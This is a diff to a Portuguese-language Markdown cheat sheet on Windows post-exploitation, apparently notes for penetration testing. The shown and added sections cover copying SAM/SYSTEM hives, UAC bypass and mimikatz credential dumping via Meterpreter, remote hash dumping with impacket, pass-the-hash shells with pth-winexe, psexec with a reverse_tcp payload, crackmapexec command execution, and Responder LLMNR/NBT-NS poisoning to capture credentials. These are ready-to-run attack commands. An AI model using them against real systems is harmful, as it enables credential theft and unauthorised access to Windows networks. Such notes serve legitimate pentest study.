@@ -51,7 +51,12 @@ Copiar os arquivos da cópia para o disco local
 ``copy \\?\VOLUME_COPIA\windows\system32\config\sam C:\sam``  
 ``copy \\?\VOLUME_COPIA\windows\system32\config\system C:\system``
 
-## Bypass UAC (Executar como Administrador)
+## Obtendo hashes de senhas na rede  
+Outra forma de descobrir os usuários e seus hashes é através da rede, mas nesse método é necessário já ter uma credencial válida do alvo.  
+
+``impacket-secretdump user:pass@host``  
+
+## Bypass UAC (Executar como Administrador)  
 
 **Enviar solicitação ao usuário - Meterpreter**  
 Inicie uma sessão com a máquina alvo através do metasploit e deixe em segundo plano com o comando ``background``. Para visualizar as sessões ativas utilize ``sessions``.
@@ -111,4 +116,37 @@ Com a sessão iniciada no meterpreter, carregue o módulo mimikatz com `load mim
 - `mimikatz_command -f sekurlsa::searchPasswords`
 - `mimikatz_command -f sekurlsa::logonPasswords`
 
+## Obtendo a shell do alvo  
+Com a senha/hash em mãos, podemos tentar nos conetctar ao alvo com uma das opções:
 
+**winexe**  
+- `winexe -U user%pass //RHOST cmd.exe `
+
+**pth (Aceita o HASH do usuário)**  
+- `pth-winexe -U user%HASH //RHOST cmd.exe `
+
+**psexec (Metasploit)** 
+Selecione o módulo **exploit/windows/smb/psexec** e faça as configurações do RHOSTS, SMBUser, SMBPass e SMBDomain. Depois defina o payload da shell reversa **windows/x64/meterpreter/reverse_tcp** e faça a configuração do LHOST e LPORT.
+Execute o comando ``exploit`` e aguarde a conexão ser realizada com sucesso.
+
+## Conexão Remota GUI com o alvo  
+Para conectar no alvo utilizando interface gráfica, utilize os comandos:
+- `xfreerdp /u:USER /p:PASS /v:RHOST`
+
+## crackmapexec (Swiss Army Knife)  
+Com esse utilitário é possível executar diversas tarefas como escaneamento da rede, conexão remota, enumeração de usuários e muito mais, alguns exemplos de como utilizar:
+
+**Visualizar módulos de SMB no crackmapexec**
+- `crackmapexec smb -L`  
+
+**Enumeração de hosts com SMB na rede**  
+- `crackmapexec smb 192.168.0.0/24`  
+
+**Execução de comando em host com SMB na rede**  
+- `crackmapexec smb RHOST -u USER -p 'PASS' -x 'whoami'`  
+
+## Responder  
+Responder é uma ferramenta muito poderosa para capturar credenciais em uma rede com dispositivos Windows. O responder se aproveita dos protocolos LLMNR e NBT-NS que fazem a identificação de um host na rede para enviar uma confirmação falsa ao solicitande, recebendo dessa forma as credenciais do usuário.
+
+**Utilizar proxy na rede**
+`responder -I eth0 -Prv`
